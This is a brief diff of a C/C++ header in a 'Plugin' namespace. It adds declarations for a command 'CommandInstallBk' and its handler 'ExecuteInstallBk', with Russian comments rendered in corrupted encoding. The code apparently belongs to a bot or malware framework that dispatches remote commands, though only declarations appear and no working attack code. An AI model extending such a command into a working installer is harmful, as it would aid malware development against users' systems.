@@ -155,6 +155,14 @@ namespace Plugin
 
 	// объ€вление команды обновлени€ плага
 	bool ExecuteUpdatePlug(void* Manager, PCHAR Command, PCHAR Args);
+
+
+	// им€ команды обновлени€ плага
+	extern const char* CommandInstallBk;
+	
+	// объ€вление команды обновлени€ плага
+	bool ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args);
+
 }
 
 
